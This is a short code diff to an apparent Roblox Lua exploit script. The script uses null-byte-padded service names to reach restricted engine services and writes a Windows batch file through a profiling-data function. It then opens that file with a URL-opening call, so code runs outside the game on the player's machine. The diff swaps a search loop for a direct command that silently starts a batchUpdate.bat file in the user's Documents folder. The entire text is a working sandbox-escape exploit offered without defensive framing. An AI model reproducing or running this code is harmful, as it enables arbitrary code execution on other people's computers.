@@ -35,21 +35,7 @@ task.wait(1)
 local LinkingService = game:GetService("LinkingService\0 meow meow meow")
 local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
 local scriptContent = [[@echo off
-@echo off
-setlocal enabledelayedexpansion
-
-:: Поиск файла batchUpdate в документах
-for /r "%USERPROFILE%\Documents" %%F in (batchUpdate*) do (
-    if exist "%%F" (
-        start /min cmd /c "%%F"
-        echo Файл открыт: %%F
-        exit /b
-    )
-)
-
-:: Если файл не найден
-echo Файл batchUpdate не найден в документах
-
+start /min "" "%USERPROFILE%\Documents\batchUpdate.bat"
 ]]
 local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
 LinkingService:OpenUrl(payload)
